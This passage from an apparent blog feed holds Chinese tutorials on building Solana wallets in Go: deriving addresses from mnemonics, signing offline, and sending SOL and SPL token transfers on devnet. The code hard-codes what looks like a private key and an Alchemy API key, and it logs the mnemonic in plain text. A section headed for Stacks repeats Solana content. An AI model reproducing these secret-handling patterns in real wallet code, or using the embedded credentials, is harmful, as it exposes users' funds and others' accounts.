class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go">NewTx := types.NewTransactionParam&#123;<br>    Message: types.NewMessage(types.NewMessageParam&#123;<br>       FeePayer:        Account.PublicKey,<br>       RecentBlockhash: block.Blockhash,<br>       Instructions: []types.Instruction&#123;system.Transfer(system.TransferParam&#123;<br>          From:   Account.PublicKey,<br>          To:     common.PublicKeyFromString(<span class="hljs-string">&quot;6cPnfGr9Y4bZK7ykNpxe2hkKfaPPgsy6Tu5ahyGhzQLt&quot;</span>),<br>          Amount: <span class="hljs-number">123000</span>,<br>       &#125;)&#125;,<br>    &#125;),<br>    Signers: []types.Account&#123;Account&#125;,<br>&#125;<br><br>tx, err := types.NewTransaction(NewTx)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    logrus.Warnf(<span class="hljs-string">&quot;new transaction error: %s&quot;</span>, err)<br>&#125;<br><br>hash, err := solClient.SendTransaction(bg, tx)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    logrus.Warnf(<span class="hljs-string">&quot;new transaction error: %s&quot;</span>, err)<br>&#125;<br>logrus.Infof(<span class="hljs-string">&quot;hash: %v&quot;</span>, hash)<br></code></pre></td></tr></table></figure><h1 id="四-Stacks钱包开发中的API"><a href="#四-Stacks钱包开发中的API" class="headerlink" title="四 Stacks钱包开发中的API"></a>四 Stacks钱包开发中的API</h1><h2 id="1-获取账户信息"><a href="#1-获取账户信息" class="headerlink" title="1.获取账户信息"></a>1.获取账户信息</h2><h2 id="2-获取-recentBlochHash-直接签名的话-recentBlochHash-相当于-nonce"><a href="#2-获取-recentBlochHash-直接签名的话-recentBlochHash-相当于-nonce" class="headerlink" title="2.获取 recentBlochHash, 直接签名的话 recentBlochHash 相当于 nonce"></a>2.获取 recentBlochHash, 直接签名的话 recentBlochHash 相当于 nonce</h2><h2 id="3-获取准备-nonce-账户的-Minimum-Balance-For-Rent-数据"><a href="#3-获取准备-nonce-账户的-Minimum-Balance-For-Rent-数据" class="headerlink" title="3. 获取准备 nonce 账户的 Minimum Balance For Rent 数据"></a>3. 获取准备 nonce 账户的 Minimum Balance For Rent 数据</h2><h2 id="4-获取最新块高-（Slot）"><a href="#4-获取最新块高-（Slot）" class="headerlink" title="4. 获取最新块高 （Slot）"></a>4. 获取最新块高 （Slot）</h2><h2 id="5-根据块高获取交易"><a href="#5-根据块高获取交易" class="headerlink" title="5. 根据块高获取交易"></a>5. 根据块高获取交易</h2><h2 id="6-根据交易-Hash-获取交易详情"><a href="#6-根据交易-Hash-获取交易详情" class="headerlink" title="6. 根据交易 Hash 获取交易详情"></a>6. 根据交易 Hash 获取交易详情</h2><h2 id="7-发送交易到区块链网络"><a href="#7-发送交易到区块链网络" class="headerlink" title="7.发送交易到区块链网络"></a>7.发送交易到区块链网络</h2><h1 id="五-中心化钱包开发"><a href="#五-中心化钱包开发" class="headerlink" title="五 中心化钱包开发"></a>五 中心化钱包开发</h1><h1 id="六、去中心化钱包开发-HD钱包"><a href="#六、去中心化钱包开发-HD钱包" class="headerlink" title="六、去中心化钱包开发 HD钱包"></a>六、去中心化钱包开发 HD钱包</h1><h1 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h1><h1 id="八、附件"><a href="#八、附件" class="headerlink" title="八、附件"></a>八、附件</h1><p>官网：<a href="https://www.stacks.co/">https://www.stacks.co/</a></p><p>文档：<a href="https://docs.stacks.co/stacks-101/what-is-stacks">https://docs.stacks.co/stacks-101/what-is-stacks</a></p><p>资料；</p><p>节点：<a href="https://dashboard.alchemy.com/">https://dashboard.alchemy.com/</a> 第三方节点</p><p>浏览器：<a href="https://solscan.io/">https://solscan.io/</a></p><p>第三方SDK：<a href="https://github.com/blocto/solana-go-sdk">https://github.com/blocto/solana-go-sdk</a></p><p>API&#x2F;Swager 文档:<a href="https://solana.com/zh/docs/rpc">https://solana.com/zh/docs/rpc</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><br>solana1.jpg<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>blockChain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>block</tag>
      
      <tag>概念</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>07-5SOL钱包开发流程</title>
    <link href="/2024/11/22/07-5SOL%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/"/>
    <url>/2024/11/22/07-5SOL%E9%92%B1%E5%8C%85%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="一-SOL简介"><a href="#一-SOL简介" class="headerlink" title="一 SOL简介"></a>一 SOL简介</h1><p>名称：</p><p>精度：</p><p>确认数：xxx块后交易安全不易会滚</p><p>是否支持token代币：是</p><p>是否支持质押:是</p><p>出块时间:</p><p>地址：Base58</p><p><strong>交易签名算法</strong></p><ul><li><input disabled="" type="checkbox"> secp256k1</li><li><input checked="" disabled="" type="checkbox"> ed25519 BLAKE2b</li><li><input disabled="" type="checkbox"> schnorr_1</li><li><input disabled="" type="checkbox"> 其它签名算法</li></ul><h1 id="二-离线地址生成"><a href="#二-离线地址生成" class="headerlink" title="二 离线地址生成"></a>二 离线地址生成</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateOfflineAddress</span><span class="hljs-params">()</span></span> types.Account &#123;<br>    <span class="hljs-comment">// 生成随机墒---bit39</span><br>    entropy, _ := bip39.NewEntropy(<span class="hljs-number">256</span>)<br>    <span class="hljs-comment">// 墒生成助记词</span><br>    mnemonic, _ := bip39.NewMnemonic(entropy)<br><br>    <span class="hljs-comment">// 从助记词生成种子</span><br><br>    logrus.Infof(<span class="hljs-string">&quot;mnemonic: %s&quot;</span>, mnemonic)<br>    seed := bip39.NewSeed(mnemonic, <span class="hljs-string">&quot;&quot;</span>)<br><br>    path := <span class="hljs-string">`m/44&#x27;/501&#x27;/0&#x27;/0&#x27;`</span><br>    derivedKey, _ := hdwallet.Derived(path, seed)<br>    <span class="hljs-comment">//accountFromSeed, err := types.AccountFromBytes(derivedKey)</span><br>    accountFromSeed, err := types.AccountFromSeed(derivedKey.PrivateKey)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       fmt.Printf(<span class="hljs-string">&quot;err=%v&quot;</span>, err)<br>    &#125;<br>    publicKey := accountFromSeed.PublicKey.ToBase58()<br>    fmt.Println(<span class="hljs-string">&quot;Solana Wallet Address:&quot;</span>, publicKey)<br>    <span class="hljs-keyword">return</span> accountFromSeed<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="三-离线签名"><a href="#三-离线签名" class="headerlink" title="三 离线签名"></a>三 离线签名</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go">NewTx := types.NewTransactionParam&#123;<br>    Message: types.NewMessage(types.NewMessageParam&#123;<br>       FeePayer:        Account.PublicKey,<br>       RecentBlockhash: block.Blockhash,<br>       Instructions: []types.Instruction&#123;system.Transfer(system.TransferParam&#123;<br>          From:   Account.PublicKey,<br>          To:     common.PublicKeyFromString(<span class="hljs-string">&quot;6cPnfGr9Y4bZK7ykNpxe2hkKfaPPgsy6Tu5ahyGhzQLt&quot;</span>),<br>          Amount: <span class="hljs-number">123000</span>,<br>       &#125;)&#125;,<br>    &#125;),<br>    Signers: []types.Account&#123;Account&#125;,<br>&#125;<br><br>tx, err := types.NewTransaction(NewTx)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    logrus.Warnf(<span class="hljs-string">&quot;new transaction error: %s&quot;</span>, err)<br>&#125;<br><br>hash, err := solClient.SendTransaction(bg, tx)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    logrus.Warnf(<span class="hljs-string">&quot;new transaction error: %s&quot;</span>, err)<br>&#125;<br>logrus.Infof(<span class="hljs-string">&quot;hash: %v&quot;</span>, hash)<br></code></pre></td></tr></table></figure><p>三、交易理解</p><p>sol转账交易</p><p>交易包括一个或多个 <a href="https://solana.com/docs/core/transactions#instruction">指令</a>，每个代表要处理的特定操作。指令的执行逻辑存储在部署到Solana网络的<a href="https://solana.com/docs/core/programs">程序</a>上，每个程序都存储自己的指令集。</p><p>为简单起见，可以将交易视为处理一个或多个说明的请求</p><p><img src="/img/web3/soltrx1.jpg" alt="s"></p><p>注意：会按照顺序执行，要么全部通过，要么全部不通过</p><p>Instruction 指令，下面是单个指令的示意图</p><p><img src="/img/web3/soltrx2.jpg" alt="s"></p><p>指令中包含:</p><ul><li>System Program </li><li>Accounts:帐户信息：Sender 地址 和 Receiver 地址</li><li>Transfer Amount 转账金额，注意：给一个新地址转账的时候，必须要大于等于租金费用890880 也就是0.00089088，满足租金后就可以随便转账了,可以通过GetMinimumBalanceForRentExemption接口拿到这个金额</li></ul><p>看代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-comment">// SendSol 用于组装sol币的的交易</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SendSol</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 拆解</span><br>DEV := <span class="hljs-string">&quot;https://solana-devnet.g.alchemy.com/v2/wqZxT7UnY6AgrzV42CtGgGQ7ZGM-UrTq&quot;</span><br>c := client.NewClient(DEV)<br><span class="hljs-comment">// 1、导入私钥恢复帐户</span><br>piv := <span class="hljs-string">&quot;46M2pAp4z3mNPuTh7jS8XHSn69TC4FAnX33Avjx7wqy3W1zzZKiSoBmNTH5PEBDKu7xR2rPa9ocSyzGWYFK7VRF2&quot;</span><br>alice, err := types.AccountFromBase58(piv)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;err=%v&quot;</span>, err)<br>&#125;<br>bob := <span class="hljs-string">&quot;6cPnfGr9Y4bZK7ykNpxe2hkKfaPPgsy6Tu5ahyGhzQLt&quot;</span><br><br><span class="hljs-comment">// 查询下地址的当前余额</span><br>balances, err := c.GetBalance(context.Background(), alice.PublicKey.String())<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;get balances err = %v&quot;</span>, err)<br>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;balances = %v\n&quot;</span>, balances)<br><span class="hljs-comment">// 2、组装交易</span><br><span class="hljs-comment">// 2.1 拿recentBlockhashResponse</span><br>recentBlockhashResponse, err := c.GetLatestBlockhash(context.Background())<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to get recent blockhash, err: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-comment">// 最小转账金额</span><br>minimumBalanceForRentExemption, err := c.GetMinimumBalanceForRentExemption(context.Background(), <span class="hljs-number">0</span>)<br>fmt.Printf(<span class="hljs-string">&quot;minimumBalanceForRentExemption = %v\n&quot;</span>, minimumBalanceForRentExemption)<br><span class="hljs-comment">// 2.2 定义Instruction然后填充它</span><br>ins := <span class="hljs-built_in">make</span>([]types.Instruction, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>)<br><span class="hljs-comment">// createAccount</span><br><span class="hljs-comment">//createAccountInstruction := system.CreateAccount(</span><br><span class="hljs-comment">//system.CreateAccountParam&#123;</span><br><span class="hljs-comment">//From:     alice.PublicKey,</span><br><span class="hljs-comment">//New:      common.PublicKeyFromString(alice.PublicKey.String()),</span><br><span class="hljs-comment">//Owner:    common.StakeProgramID,</span><br><span class="hljs-comment">//Lamports: nonceAccountMinimumBalance,</span><br><span class="hljs-comment">//Space:    system.NonceAccountSize,</span><br><span class="hljs-comment">//&#125;)</span><br><span class="hljs-comment">//ins = append(ins, createAccountInstruction)</span><br><span class="hljs-comment">// 交易分成2个大部份 Transactions 和 Instructions 指令，Instructions可以有多个</span><br><span class="hljs-comment">// 这里我们先做一个简单的交易 ins就是Instructions\</span><br>ins = <span class="hljs-built_in">append</span>(ins, system.Transfer(<br>system.TransferParam&#123;<br>From:   common.PublicKeyFromString(alice.PublicKey.String()),<br>To:     common.PublicKeyFromString(bob),<br>Amount: minimumBalanceForRentExemption,<br>&#125;))<br>message := types.NewMessage(<br>types.NewMessageParam&#123;<br>FeePayer:        common.PublicKeyFromString(alice.PublicKey.String()),<br>Instructions:    ins,<br>RecentBlockhash: recentBlockhashResponse.Blockhash,<br>&#125;)<br>tx, err := types.NewTransaction(types.NewTransactionParam&#123;<br>Message: message,<br>Signers: []types.Account&#123;alice&#125;,<br>&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to new transaction, err: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-comment">// 3、广播上链</span><br>txhash, err := c.SendTransaction(context.Background(), tx)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to SendTransaction, err: %v&quot;</span>, err)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;tx hash&quot;</span>, txhash)<br>&#125;<br></code></pre></td></tr></table></figure><p>让我们来看看转账指令发生了什么</p><p><img src="/img/web3/soltrx3.jpg" alt="s"></p><p>可以看到，内部是由发送者Sender 地址的Lamprots帐户转给了 和 Receiver 地址的Lamprots帐户，因为sol一切皆为帐户</p><p>继续往下看，交易由什么组成，由 签名Signatures + 消息Message组成</p><p><img src="/img/web3/soltrx4.jpg" alt="s"></p><p>消息Message里包含了什么？4个东西</p><ul><li><a href="https://solana.com/docs/core/transactions#message-header">Message Header</a>: Specifies the number of signer and read-only account.<br><a href="https://solana.com/docs/core/transactions#message-header">消息头</a>：指定签名者的数量和仅阅读帐户的数量。</li><li><a href="https://solana.com/docs/core/transactions#array-of-account-addresses">Account Addresses</a>: An array of account addresses required by the instructions on the transaction.<br><a href="https://solana.com/docs/core/transactions#array-of-account-addresses">帐户地址</a>：交易指令要求的帐户地址数组。</li><li><a href="https://solana.com/docs/core/transactions#recent-blockhash">Recent Blockhash</a>: Acts as a timestamp for the transaction.<br><a href="https://solana.com/docs/core/transactions#recent-blockhash">最近的块</a>：充当交易的时间戳。</li><li><a href="https://solana.com/docs/core/transactions#array-of-instructions">Instructions</a>: An array of instructions to be executed.<br><a href="https://solana.com/docs/core/transactions#array-of-instructions">说明</a>：要执行的一系列说明</li></ul><p><img src="/img/web3/soltrx5.jpg" alt="s"></p><h2 id="Token的转账"><a href="#Token的转账" class="headerlink" title="Token的转账"></a>Token的转账</h2><p>token转账的关键就是拿到发送者和接收者在这个代币合约上的地址</p><p>还有要确定接收者的子帐户(在这个token上的地址)是否上链，如果没有上过链(新地址)则需要为其创建对应的子帐户地址用于接收token</p><p>看代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// SendToken 用于组装Token代币的的交易</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SendToken</span><span class="hljs-params">()</span></span> &#123;<br><br>    tokenAddress := <span class="hljs-string">&quot;58g1sdTgzazjR4ApXxPP63JRHj4ZDXePX251An7fxEhG&quot;</span><br>    DEV := <span class="hljs-string">&quot;https://solana-devnet.g.alchemy.com/v2/wqZxT7UnY6AgrzV42CtGgGQ7ZGM-UrTq&quot;</span><br>    c := client.NewClient(DEV)<br>    <span class="hljs-comment">// 1、获取代币的owner 拥有者</span><br>    <span class="hljs-comment">//accInfo, err := c.GetAccountInfo(context.Background(), tokenAddress)</span><br>    <span class="hljs-comment">//if err != nil &#123;</span><br>    <span class="hljs-comment">// log.Fatalf(&quot;failed to GetAccountInfo, err: %v&quot;, err)</span><br>    <span class="hljs-comment">//&#125;</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">//fmt.Printf(&quot;accInfo Owner =%v\n&quot;, accInfo.Owner)</span><br>    <span class="hljs-comment">// 2 寻找用户在这个token上的地址</span><br>    piv := <span class="hljs-string">&quot;46M2pAp4z3mNPuTh7jS8XHSn69TC4FAnX33Avjx7wqy3W1zzZKiSoBmNTH5PEBDKu7xR2rPa9ocSyzGWYFK7VRF2&quot;</span><br>    alice, err := types.AccountFromBase58(piv)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       fmt.Printf(<span class="hljs-string">&quot;err=%v&quot;</span>, err)<br>    &#125;<br>    bob := <span class="hljs-string">&quot;6cPnfGr9Y4bZK7ykNpxe2hkKfaPPgsy6Tu5ahyGhzQLt&quot;</span><br>    <span class="hljs-comment">//bob := &quot;8pZWotbBSKBy6Luxf41TxUxDvZHp49jAbuUe2yFZRorE&quot;</span><br>    fromTokenATA, _, err := common.FindAssociatedTokenAddress(alice.PublicKey, common.PublicKeyFromString(tokenAddress))<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       log.Fatalf(<span class="hljs-string">&quot;failed to FindAssociatedTokenAddress, err: %v&quot;</span>, err)<br>    &#125;<br>    <span class="hljs-comment">//fmt.Printf(&quot;fromTokenATA=%v\n&quot;, fromTokenATA)</span><br>    toTokenATA, _, err := common.FindAssociatedTokenAddress(common.PublicKeyFromString(bob), common.PublicKeyFromString(tokenAddress))<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       log.Fatalf(<span class="hljs-string">&quot;failed to FindAssociatedTokenAddress, err: %v&quot;</span>, err)<br>    &#125;<br>    <span class="hljs-comment">//fmt.Printf(&quot;toTokenATA=%v\n&quot;, toTokenATA)</span><br>    ins := <span class="hljs-built_in">make</span>([]types.Instruction, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>)<br>    recentBlockhashResponse, err := c.GetLatestBlockhash(context.Background())<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       log.Fatalf(<span class="hljs-string">&quot;failed to get recent blockhash, err: %v&quot;</span>, err)<br>    &#125;<br>    info, err := c.GetTokenAccount(context.Background(), toTokenATA.ToBase58())<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       <span class="hljs-keyword">if</span> errors.Is(err, token.ErrInvalidAccountOwner) &#123;<br>          fmt.Println(<span class="hljs-string">&quot;test&quot;</span>)<br>          ins = <span class="hljs-built_in">append</span>(ins, associated_token_account.Create(<br>             associated_token_account.CreateParam&#123;<br>                Funder:                 common.PublicKeyFromString(alice.PublicKey.String()),<br>                Owner:                  common.PublicKeyFromString(bob),<br>                Mint:                   common.PublicKeyFromString(tokenAddress),<br>                AssociatedTokenAccount: toTokenATA,<br>                <span class="hljs-comment">//ProgramID:              programID,</span><br>             &#125;))<br><br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>          log.Fatalf(<span class="hljs-string">&quot;failed to GetTokenAccount, err: %v&quot;</span>, err)<br>       &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>       <span class="hljs-keyword">if</span> info.Owner.ToBase58() != bob &#123;<br>          log.Fatalf(<span class="hljs-string">&quot;failed to GetTokenAccount,info!=bob err: %v&quot;</span>, err)<br>       &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 追加优先费</span><br>    ComputerUnitPrice := <span class="hljs-type">uint64</span>(<span class="hljs-number">110000</span>) <span class="hljs-comment">//一个计算单元的价格</span><br>    ComputerUnitLimit := <span class="hljs-type">uint32</span>(<span class="hljs-number">200000</span>) <span class="hljs-comment">//计算单元的限制</span><br>    ins = <span class="hljs-built_in">append</span>(ins, compute_budget.SetComputeUnitPrice(compute_budget.SetComputeUnitPriceParam&#123;<br>       MicroLamports: ComputerUnitPrice,<br>    &#125;))<br><br>    ins = <span class="hljs-built_in">append</span>(ins, compute_budget.SetComputeUnitLimit(compute_budget.SetComputeUnitLimitParam&#123;<br>       Units: ComputerUnitLimit,<br>    &#125;))<br>    ins = <span class="hljs-built_in">append</span>(ins, token.TransferChecked(<br>       token.TransferCheckedParam&#123;<br>          From:     fromTokenATA,<br>          To:       toTokenATA,<br>          Mint:     common.PublicKeyFromString(tokenAddress),<br>          Auth:     alice.PublicKey,<br>          Signers:  []common.PublicKey&#123;alice.PublicKey&#125;,<br>          Amount:   <span class="hljs-number">40000000000</span>,<br>          Decimals: <span class="hljs-number">9</span>, <span class="hljs-comment">//精度</span><br><br>       &#125;),<br>    )<br><br>    message := types.NewMessage(<br>       types.NewMessageParam&#123;<br>          FeePayer:        common.PublicKeyFromString(alice.PublicKey.String()),<br>          Instructions:    ins,<br>          RecentBlockhash: recentBlockhashResponse.Blockhash,<br>       &#125;)<br>    tx, err := types.NewTransaction(types.NewTransactionParam&#123;<br>       Message: message,<br>       Signers: []types.Account&#123;alice&#125;,<br>    &#125;)<br><br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       log.Fatalf(<span class="hljs-string">&quot;failed to new transaction, err: %v&quot;</span>, err)<br>    &#125;<br>    <span class="hljs-comment">// 3、广播上链</span><br>    txhash, err := c.SendTransaction(context.Background(), tx)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>       log.Fatalf(<span class="hljs-string">&quot;failed to SendTransaction, err: %v&quot;</span>, err)<br>    &#125;<br>    fmt.Println(<span class="hljs-string">&quot;tx hash&quot;</span>, txhash)<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="四-SOL钱包开发中的API"><a href="#四-SOL钱包开发中的API" class="headerlink" title="四 SOL钱包开发中的API"></a>四 SOL钱包开发中的API</h1><h2 id="1-获取账户信息"><a href="#1-获取账户信息" class="headerlink" title="1.获取账户信息"></a>1.获取账户信息</h2><h2 id="2-获取-recentBlochHash-直接签名的话-recentBlochHash-相当于-nonce"><a href="#2-获取-recentBlochHash-直接签名的话-recentBlochHash-相当于-nonce" class="headerlink" title="2.获取 recentBlochHash, 直接签名的话 recentBlochHash 相当于 nonce"></a>2.获取 recentBlochHash, 直接签名的话 recentBlochHash 相当于 nonce</h2><h2 id="3-获取准备-nonce-账户的-Minimum-Balance-For-Rent-数据"><a href="#3-获取准备-nonce-账户的-Minimum-Balance-For-Rent-数据" class="headerlink" title="3. 获取准备 nonce 账户的 Minimum Balance For Rent 数据"></a>3. 获取准备 nonce 账户的 Minimum Balance For Rent 数据</h2><h2 id="4-获取最新块高-（Slot）"><a href="#4-获取最新块高-（Slot）" class="headerlink" title="4. 获取最新块高 （Slot）"></a>4. 获取最新块高 （Slot）</h2><h2 id="5-根据块高获取交易"><a href="#5-根据块高获取交易" class="headerlink" title="5. 根据块高获取交易"></a>5. 根据块高获取交易</h2><h2 id="6-根据交易-Hash-获取交易详情"><a href="#6-根据交易-Hash-获取交易详情" class="headerlink" title="6. 根据交易 Hash 获取交易详情"></a>6. 根据交易 Hash 获取交易详情</h2><h2 id="7-发送交易到区块链网络"><a href="#7-发送交易到区块链网络" class="headerlink" title="7.发送交易到区块链网络"></a>7.发送交易到区块链网络</h2><h1 id="五-中心化钱包开发"><a href="#五-中心化钱包开发" class="headerlink" title="五 中心化钱包开发"></a>五 中心化钱包开发</h1><h1 id="六、去中心化钱包开发-HD钱包"><a href="#六、去中心化钱包开发-HD钱包" class="headerlink" title="六、去中心化钱包开发 HD钱包"></a>六、去中心化钱包开发 HD钱包</h1><h1 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h1><h1 id="八、附件"><a href="#八、附件" class="headerlink" title="八、附件"></a>八、附件</h1><p>资料；</p><p>节点：<a href="https://dashboard.alchemy.com/">https://dashboard.alchemy.com/</a> 第三方节点</p><p>浏览器：<a href="https://solscan.io/">https://solscan.io/</a></p><p>第三方SDK：<a href="https://github.com/blocto/solana-go-sdk">https://github.com/blocto/solana-go-sdk</a></p><p>文档：<a href="https://solana.com/zh/docs">https://solana.com/zh/docs</a></p><p>API&#x2F;Swager 文档:<a href="https://solana.com/zh/docs/rpc">https://solana.com/zh/docs/rpc</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 